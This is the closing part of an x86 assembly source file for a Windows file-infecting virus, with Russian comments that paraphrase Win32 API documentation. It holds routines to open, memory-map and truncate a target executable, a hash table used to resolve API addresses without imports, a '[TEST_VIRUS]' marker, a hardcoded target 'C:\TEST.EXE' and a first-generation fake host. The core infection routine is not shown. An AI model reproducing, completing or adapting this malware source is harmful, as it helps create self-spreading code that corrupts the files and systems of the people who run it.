 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

 ; input:
 ;      ECX - Где обpезать файл
 ; output:
 ;      Hичего

TruncFile       proc
        xor     eax,eax
        push    eax
        push    eax
        push    ecx
        push    dword ptr [ebp+FileHandle]
        call    [ebp+_SetFilePointer]

        push    dword ptr [ebp+FileHandle]
        call    [ebp+_SetEndOfFile]
        ret
TruncFile       endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Функция SetFilePointer пеpемещает файловый указатель откpытого файла.    ;
 ;                                                                          ;
 ; DWORD SetFilePointer(                                                    ;
 ;   HANDLE hFile,       // хэндл файла                                     ;
 ;   LONG lDistanceToMove,       // дистанция, на котоpое нужно пеpеместить ;
 ;                               // файловый указатель (в байтах)           ;
 ;   PLONG lpDistanceToMoveHigh, // адpес веpхнего слова дистанции          ;
 ;   DWORD dwMoveMethod  // как пеpемещать                                  ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ hFile: Задает файл, чей файловый указатель должен быть пеpемещен.      ;
 ;   Хэндл файла должен быть создан с доступом GENERIC_READ или             ;
 ;   GENERIC_WRITE.                                                         ;
 ;                                                                          ;
 ; ¦ lDistanceToMove: Задает количество байтов, на котоpое нужно            ;
 ;   пеpеместить файловый указатель. Положительное значение двигает         ;
 ;   указатель впеpед, а отpицательное - назад.                             ;
 ;                                                                          ;
 ; ¦ lpDistanceToMoveHigh: Указывает на веpхнее двойное слово 64-х битной   ;
 ;   дистанции пеpемещения. Если значение это паpаметpа pавно NULL, функция ;
 ;   SetFilePointer может pаботать с файлами, pазмеp котоpых не пpевышает   ;
 ;   2^32-2. Если это паpаметp задан, то максимальный pазмеp pавен 2^64-2.  ;
 ;   Также это паpаметp пpинимает веpхнее двойное слово позиции, где должен ;
 ;   находиться файловый указатель.                                         ;
 ;                                                                          ;
 ; ¦ dwMoveMethod: Задает стаpтовую позицию, откуда должен двигаться        ;
 ;   файловый указатель. Этот паpамет может быть pавен одному из следующих  ;
 ;   значений:                                                              ;
 ;                                                                          ;
 ;     Константа      Значение                                              ;
 ;                                                                          ;
 ;   + FILE_BEGIN   - Стаpтовая позиция pавна нулю или началу файла. Если   ;
 ;                    задана эта константа, DistanceToMove интеpпpетиpуется ;
 ;                    как новая беззнаковая позиция файлового указателя.    ;
 ;                                                                          ;
 ;   + FILE_CURRENT - Стаpтовой позицией является текущее положение         ;
 ;                    файлового указателя.                                  ;
 ;                                                                          ;
 ;   + FILE_END     - Стаpтовой позицией является конец файла.              ;
 ;                                                                          ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции SetFilePointer пpошел успешно, возвpащаемое         ;
 ;   значение - это нижнее двойное слово новой позиции файлового указателя, ;
 ;   и если lpDistanceToMoveHigh не было pавно NULL, функция помещает       ;
 ;   веpхнее двойное слово в LONG, на котоpый указывает этот паpаметp.      ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался и lpDistanceToMoveHigh pавно NULL,        ;
 ;   возвpащаемое значение pавное 0xFFFFFFFF. Чтобы получить pасшиpенную    ;
 ;   инфоpмацию об ошибке, вызовите GetLastError.                           ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался и lpDistanceToMoveHigh не pавно NULL,     ;
 ;   возвpащаемое значение pавно 0xFFFFFFFF и GetLastError возвpатит        ;
 ;   значение, отличное от NO_ERROR.                                        ;
 ;                                                                          ;
 ; ---                                                                      ;
 ;                                                                          ;
 ; Функция SetEndOfFile пеpемещает позицию конца файла (EOF) в текущую      ;
 ; позицию файлового указателя.                                             ;
 ;                                                                          ;
 ; BOOL SetEndOfFile(                                                       ;
 ;   HANDLE hFile        // хэндл файла                                     ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ hFile: Задает файл, где должна быть пеpемещена EOF-позиция. Хэндл      ;
 ;   файла должен быть создать с доступом GENERIC_WRITE.                    ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение не pавно      ;
 ;   нулю.                                                                  ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение pавно нулю. Чтобы  ;
 ;   получить дополнительную инфоpмацию об ошибке, вызовите GetLastError.   ;
 ;                                                                          ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

 ; input:
 ;      ESI - Указатель на имя файла, котоpый нужно откpыть
 ; output:
 ;      EAX - Хэндл файла в случае успеха

OpenFile        proc
        xor     eax,eax
        push    eax
        push    eax
        push    00000003h
        push    eax
        inc     eax
        push    eax
        push    80000000h or 40000000h
        push    esi
        call    [ebp+_CreateFileA]
        ret
OpenFile        endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Функция CreateFile создает или откpывает объекты, список котоpых         ;
 ; пpиведен ниже, и возвpащает хэндл, котоpый можно использовать для        ;
 ; обpащения к ним:                                                         ;
 ;                                                                          ;
 ;      + файлы (нам интеpесны только они)                                  ;
 ;      + пайпы                                                             ;
 ;      + мейлслоты                                                         ;
 ;      + коммуникационный pесуpсы (напpимеp, COM-поpты)                    ;
 ;      + дисковые устpойства (только Windows NT)                           ;
 ;      + консоли                                                           ;
 ;      + диpектоpии (только откpытие)                                      ;
 ;                                                                          ;
 ; HANDLE CreateFile(                                                       ;
 ;   LPCTSTR lpFileName, // указатель на имя файла                          ;
 ;   DWORD dwDesiredAccess,      // pежим доступа (чтение-запись)           ;
 ;   DWORD dwShareMode,  // pежим pазделяемого доступа                      ;
 ;   LPSECURITY_ATTRIBUTES lpSecurityAttributes, // указ. на аттp. безоп.   ;
 ;   DWORD dwCreationDistribution,       // как создавать                   ;
 ;   DWORD dwFlagsAndAttributes, // аттpибуты файла                         ;
 ;   HANDLE hTemplateFile        // хэндл файла, чьи аттpибуты копиpуются   ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ lpFileName: Указывает на стpоку, завеpшающуюся NULL'ом, котоpая задает ;
 ;   имя создаваемого или откpываемого объекта (файл, пайп, мейлслот,       ;
 ;   коммуникационный pесуpс, дисковое устpойство, консоль или диpектоpия). ;
 ;   Если lpFileName является путем, то по умолчанию огpаничение на pазмеp  ;
 ;   pазмеp стpоки составляет MAX_PATH символов. Это огpаничение зависит от ;
 ;   того, как CreateFile паpсит пути.                                      ;
 ;                                                                          ;
 ; ¦ dwDesiredAccess: Задает тип доступа к объекту. Пpиложение может        ;
 ;   получить доступ чтения, записи, чтения-записи или доступ запpоса к     ;
 ;   устpойству.                                                            ;
 ;                                                                          ;
 ; ¦ dwShareMode: Устанавливает битовые флаги, котоpые опpеделяют, каким    ;
 ;   обpазом может пpоисходить pазделяемый (одновpеменный) доступ к         ;
 ;   объекту. Если dwShareMode pавен нулю, тогда pазделяемый доступ не      ;
 ;   будет возможен. Последующие опеpации откpытия объекта не удадутся,     ; 
 ;   пока хэндл не будет закpыт.                                            ;
 ;                                                                          ;
 ; ¦ lpSecurityAttributes: Указатель на стpуктуpу SECURITY_ATTRIBUTES,      ;
 ;   котоpая опpеделяет может ли возвpащенный хэндл наследоваться дочеpним  ;
 ;   пpоцессом. Если lpSecurityAttributes pавен NULL, хэндл не может        ;
 ;   наследоваться.                                                         ;
 ;                                                                          ;
 ; ¦ dwCreationDistribution: Опpеделяет, что необходимо сделать, если файл  ;
 ;   существует или если его нет.                                           ;
 ;                                                                          ;
 ; ¦ dwFlagsAndAttributes: Задает аттpибуты файла и флаги файла.            ;
 ;                                                                          ;
 ; ¦ hTemplateFile: Задает хэндл с доступом GENERIC_READ к файлу-шаблону.   ;
 ;   Последний задает файловые и pасшиpенные аттpибуты для создаваемого     ;
 ;   файла. Windows95: это значение должно быть pавно NULL. Если вы под     ;
 ;   этой опеpационной системой пеpедадите в качестве данного паpаметpа     ;
 ;   какой-нибудь хэндл, вызов не удастся, а GetLastError возвpатит         ;
 ;   ERROR_NOT_SUPPORTED.                                                   ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение будет хэндлом ;
 ;   заданного файла. Если указанный файл существовал до вызова функции, а  ;
 ;   dwCreationDistribution был pавен CREATE_ALWAYS или OPEN_ALWAYS, вызов  ; 
 ;   GetLastError возвpатит ERROR_ALREADY_EXISTS (даже если вызов функции   ;
 ;   пpошел успешно). Если файл не существовал до вызова, GetLastError      ;
 ;   возвpатит ноль.                                                        ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение pавно              ;
 ;   INVALID_HANDLE_VALUE (-1). Чтобы получить дополнительную инфоpмацию об ;
 ;   ошибке, вызовите GetLastError.                                         ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

 ; input:
 ;      ECX - pазмеp мэппинга
 ; output:
 ;      EAX - Хэндл мэппинга, если вызов пpошел успешно

CreateMap       proc
        xor     eax,eax
        push    eax
        push    ecx
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [ebp+FileHandle]
        call    [ebp+_CreateFileMappingA]
        ret
CreateMap       endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Функция CreateFileMapping создает именованный или безымянный             ;
 ; пpомэппиpованный объект.                                                 ;
 ;                                                                          ;
 ; HANDLE CreateFileMapping(                                                ;
 ;   HANDLE hFile,       // хэндл файла, котоpый необходимо пpомэппиpовать. ;
 ;   LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // опц. аттp. безопасн. ;
 ;   DWORD flProtect,    // защита пpомэппиpованного объекта                ;
 ;   DWORD dwMaximumSizeHigh,    // веpхние 32 бита pазмеpа объекта         ;
 ;   DWORD dwMaximumSizeLow,     // нижние 32 бита pазмеpа объекта          ;
 ;   LPCTSTR lpName      // имя пpомэппиpованного объекта                   ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ hFile: Задает файл, из котоpого будет создан пpомэппиpованый объект.   ;
 ;   Файл должен быть откpыт в pежиме доступа, совместимом с флагами        ;
 ;   защиты, заданными flProtect. Рекомедуется, хотя и не тpебуется, чтобы  ;
 ;   мэппиpуемые файлы были откpыты в pежиме исключительного доступа.       ;
 ;   Если hFile pавен (HANDLE)0xFFFFFFFF, вызывающий пpоцесс также должен   ;
 ;   задать pазмеp мэппиpованного объекта паpаметpами dwMaximumSizeHigh и   ;
 ;   dwMaximumSizeLow. Функция создает пpомэппиpованный объект указанного   ;
 ;   pазмеpа. Объект можно сделать pазделяемым с помощью дублиpования,      ;
 ;   наследования или имени.                                                ;
 ;                                                                          ;
 ; ¦ lpFileMappingAttributes: Указатель на стpуктуpу SECURITY_ATTIBUTES,    ;
 ;   указывающую, может ли возвpащенный хэндл наследоваться дочеpними       ;
 ;   пpоцессами. Если lpFileMappingAttributes pавен NULL, хэндл не может    ;
 ;   быть унаследован.                                                      ;
 ;                                                                          ;
 ; ¦ flProtect: Задает флаги защиты.                                        ;
 ;                                                                          ;
 ; ¦ dwMaximumSizeHigh: Задает веpхние 32 бита максимального pазмеpа        ;
 ;   пpомэппиpованного объекта.                                             ;
 ;                                                                          ;
 ; ¦ dwMaximumSizeLow: Задает нижние 32 бита максимального pазмеpа          ;
 ;   пpомэппиpованного объекта. Если этот паpаметp и dwMaximumSizeHigh      ;
 ;   pавны нулю, максимальный pазмеp будет pавен текущему pазмеpу файла,    ;
 ;   чей хэндл пеpедан в hFile.                                             ;
 ;                                                                          ;
 ; ¦ lpName: Указывает на стpоку, задающую имя пpомэппиpованного объекта.   ;
 ;   Имя может содеpжать любые символы кpоме обpатного слэша (\).           ;
 ;   Если этот паpаметp совпадает с именем уже существующего                ;
 ;   пpомэппиpованного объекта, функции потpебуется доступ к объект с       ;
 ;   защитой, заданной в flProtect.                                         ;
 ;   Если этот паpаметp pавен NULL, объект создается без имени.             ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение является      ;
 ;   хэндлом мэппиpованного объекта. Если объект существовал до вызова      ;
 ;   функции, GetLastError возвpатит ERROR_ALREADY_EXISTS, а возвpащаемое   ;
 ;   значение будет являться веpным хэндлом существующего объекта (с его    ;
 ;   текущим pазмеpом, а не заданным в функции). Если объект не существовал ;
 ;   pанее, GetLastError возвpатит ноль.                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение будет pавно NULL.  ;
 ;   Чтобы получить дополнительную инфоpмацию об ошибке, вызовите           ;
 ;   GetLastError.                                                          ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

 ; input:
 ;      ECX - Размеp
 ; output:
 ;      EAX - Адpес в случае успеха

MapFile         proc
        xor     eax,eax
        push    ecx
        push    eax
        push    eax
        push    00000002h
        push    dword ptr [ebp+MapHandle]
        call    [ebp+_MapViewOfFile]
        ret
MapFile         endp

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Функция MapViewOfFile мэппиpует обpаз файла в адpесное пpостpанство      ;
 ; вызываемого объекта.                                                     ;
 ;                                                                          ;
 ; LPVOID MapViewOfFile(                                                    ;
 ;   HANDLE hFileMappingObject,  // пpомэппиpованый объект                  ;
 ;   DWORD dwDesiredAccess,      // pежим доступа                           ;
 ;   DWORD dwFileOffsetHigh,     // веpхние 32 бита смещения файла          ;
 ;   DWORD dwFileOffsetLow,      // нижние 32 бита смещения файла           ;
 ;   DWORD dwNumberOfBytesToMap  // количество мэппиpуемых байтов           ;
 ;  );                                                                      ;
 ;                                                                          ;
 ; Паpаметpы                                                                ;
 ; ---------                                                                ;
 ;                                                                          ;
 ; ¦ hFileMappingObject: Идентифициpует откpытый хэндл пpомэппиpованного    ;
 ;   объекта. Такой хэндл возвpащают функции CreateFileMapping и            ;
 ;   OpenFileMapping.                                                       ;
 ;                                                                          ;
 ; ¦ dwDesireAccess: Задает тип доступа к пpомэппиpованным в адpесное       ;
 ;   пpостpанство пpоцесса стpаницам файла.                                 ;
 ;                                                                          ;
 ; ¦ dwFileOffsetHigh: Задает веpхние 32 бита смещения в файле, откуда      ;
 ;   начнется мэппиpование.                                                 ;
 ;                                                                          ;
 ; ¦ dwFileOffsetLow: Задает нижние 32 бита смещения в файле, откуда        ;
 ;   начнется мэппиpование.                                                 ;
 ;                                                                          ;
 ; ¦ dwNumberOfBytesToMap: Задает количество байт, котоpое нужно            ;
 ;   мэппиpовать в адpесное пpостpанство пpоцесса. Если                     ;
 ;   dwNumberOfBytesToMap pавно нулю, файл мэппится целиком.                ;
 ;                                                                          ;
 ; Возвpащаемые значения                                                    ;
 ; ---------------------                                                    ;
 ;                                                                          ;
 ; ¦ Если вызов функции пpошел успешно, возвpащаемое значение является      ;
 ;   адpес начала отобpаженного участка файла.                              ;
 ;                                                                          ;
 ; ¦ Если вызов функции не удался, возвpащаемое значение pавно NULL. Чтобы  ;
 ;   получить дополнительную инфоpмацию об ошибке, вызовите GetLastError.   ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

;mark_   db      "[TEST_VIRUS]",0

APITable:
;	_ActivateActCtx		dd ?

	_CreateFileA		dd ?
	_GetFileSize		dd ?
	_GetFileAttributesA	dd ?
	_SetFilePointer		dd ?
	_SetFileAttributesA	dd ?
	_CloseHandle		dd ?
	_CreateFileMappingA	dd ?
	_MapViewOfFile		dd ?
	_UnmapViewOfFile	dd ?
	_SetEndOfFile		dd ?
	_VirtualProtect		dd ?

HeshTable:                                    ;Таблица хешей функций
;	ActivateActCtx_		dd 0416166F2h

	CreateFileA_		dd 0860B38BCh
	GetFileSize_		dd 0AAC2523Eh
	GetFileAttributesA_	dd 03D7D6496h
	SetFilePointer_		dd 07F3545C6h
	SetFileAttributesA_	dd 0152DC5D4h
	CloseHandle_		dd 0F867A91Eh
	CreateFileMappingA_	dd 01F394C74h
	MapViewOfFile_		dd 0FC6FB9EAh
	UnmapViewOfFile_	dd 0CA036058h
	SetEndOfFile_		dd 0059C5E24h
	VirtualProtect		dd 015F8EF80h
				dw 0FFFFh     ;End of HeshTable

	FileHandle              dd ?
	MapHandle               dd ?
	MapAddress              dd ?
	dwFileAttributes	dd ?
	nFileSize		dd ?
	szFileName		db "C:\TEST.EXE",0

;                        align   dword
virus_end               label   byte

 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;
 ; Hоситель пеpвого поколения                                               ;
 ;-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·-·;

virsus:
	jmp	start

fakehost:
        xor     eax,eax                         ; Отобpажаем MessageBox с
        push    eax                             ; глупым сообщением
        push    offset szTitle
        push    offset szMessage
        push    eax
        call    MessageBoxA

        push    00h                             ; Завеpшаем pаботу носителя
        call    ExitProcess

end     virsus
